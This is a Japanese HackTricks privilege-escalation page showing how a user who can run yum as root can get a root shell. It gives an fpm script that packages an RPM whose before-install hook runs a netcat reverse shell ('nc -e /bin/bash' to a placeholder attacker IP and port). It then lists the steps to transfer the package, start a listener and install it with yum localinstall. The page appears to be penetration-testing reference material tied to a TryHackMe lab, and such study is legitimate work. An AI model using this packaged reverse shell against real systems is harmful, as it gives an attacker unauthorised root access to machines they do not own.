<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションを発見する
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) をフォローする。
* **ハッキングトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github リポジトリに提出してください。

</details>

yumに関するさらなる例は、[gtfobins](https://gtfobins.github.io/gtfobins/yum/) で見つけることができます。

# RPMパッケージを介した任意のコマンドの実行
## 環境の確認
このベクトルを活用するためには、ユーザーが高い特権を持つユーザーとしてyumコマンドを実行できる必要があります。つまり、rootユーザーである必要があります。

### このベクトルの動作例
この脆弱性の動作例は、[tryhackme](https://tryhackme.com) の [daily bugle](https://tryhackme.com/room/dailybugle) ルームで見つけることができます。

## RPMのパッケージング
次のセクションでは、[fpm](https://github.com/jordansissel/fpm) を使用してRPMに逆シェルをパッケージ化する方法について説明します。

以下の例では、攻撃者が定義できる任意のスクリプトを持つ before-install トリガーを含むパッケージを作成します。このパッケージをインストールすると、任意のコマンドが実行されます。デモンストレーション用にシンプルな逆ネットキャットシェルの例を使用しましたが、必要に応じて変更できます。
```text
EXPLOITDIR=$(mktemp -d)
CMD='nc -e /bin/bash <ATTACKER IP> <PORT>'
RPMNAME="exploited"
echo $CMD > $EXPLOITDIR/beforeinstall.sh
fpm -n $RPMNAME -s dir -t rpm -a all --before-install $EXPLOITDIR/beforeinstall.sh $EXPLOITDIR
```
# シェルを取得する
上記の例を使用し、`yum`を特権のあるユーザーとして実行できると仮定します。

1. ホストにrpmを**転送**します
2. ローカルホストで[例のnetcatリスナー](/shells/shells/linux#netcat)などを**起動**します
3. 脆弱なパッケージをインストールします `yum localinstall -y exploited-1.0-1.noarch.rpm`
